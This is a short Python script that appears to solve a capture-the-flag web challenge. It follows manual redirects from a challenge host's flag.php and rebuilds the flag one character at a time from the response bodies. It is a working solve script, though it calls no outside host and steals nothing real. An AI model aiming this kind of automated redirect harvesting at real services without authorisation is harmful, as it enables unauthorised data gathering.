import requests

flag = ['\x00'] * 100
link = 'http://jh2i.com:50011'
loc = '/site/flag.php'

while '}' not in flag:
	session = requests.Session()
	response = session.get(link + loc, allow_redirects=False)
	if 'flag' in response.text:
		loc = response.headers['Location']
		data = response.text.strip().split(' ')
		index = int(data[1])
		flag[index] = data[-1]
		print(response.text.strip())
	else:
		loc = response.headers['Location']
print(''.join(flag))